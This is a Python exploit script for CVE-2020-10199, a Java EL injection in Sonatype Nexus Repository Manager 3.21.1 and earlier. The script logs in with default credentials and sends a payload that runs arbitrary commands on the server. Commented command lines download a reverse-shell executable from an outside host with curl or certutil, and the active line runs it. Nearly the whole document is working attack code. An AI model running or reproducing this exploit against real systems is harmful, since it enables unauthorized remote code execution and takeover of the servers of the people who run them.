# Exploit Title: Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)
# Exploit Author: 1F98D
# Original Author: Alvaro Muñoz
# Date: 27 May 2020
# Vendor Hompage: https://www.sonatype.com/
# CVE: CVE-2020-10199
# Tested on: Windows 10 x64
# References:
# https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype
# https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype
#
# Nexus Repository Manager 3 versions 3.21.1 and below are vulnerable
# to Java EL injection which allows a low privilege user to remotely
# execute code on the target server.
#
#!/usr/bin/python3

import sys
import base64
import requests

URL='http://192.168.147.61:8081'
#CMD='cmd.exe /c curl -o c:/users/public/documents/reverse.exe http://192.168.49.147/reverse.exe'
#CMD='cmd.exe /c certutil.exe -f -urlcache -split http://192.168.49.147/reverse.exe c:/windows/temp/reverse.exe'
CMD='cmd.exe /c c:/windows/temp/reverse.exe'
USERNAME='nexus'
PASSWORD='nexus'

s = requests.Session()
print('Logging in')
body = {
    'username': base64.b64encode(USERNAME.encode('utf-8')).decode('utf-8'),
    'password': base64.b64encode(PASSWORD.encode('utf-8')).decode('utf-8')
}
r = s.post(URL + '/service/rapture/session',data=body)
if r.status_code != 204:
    print('Login unsuccessful')
    print(r.status_code)
    sys.exit(1)
print('Logged in successfully')

body = {
    'name': 'internal',
    'online': True,
    'storage': {
        'blobStoreName': 'default',
        'strictContentTypeValidation': True
    },
    'group': {
        'memberNames': [
            '$\\A{\'\'.getClass().forName(\'java.lang.Runtime\').getMethods()[6].invoke(null).exec(\''+CMD+'\')}"'
        ]
    },
}
r = s.post(URL + '/service/rest/beta/repositories/go/group', json=body)
if 'java.lang.ProcessImpl' in r.text:
    print('Command executed')
    sys.exit(0)
else:
    print('Error executing command, the following was returned by Nexus')
    print(r.text)
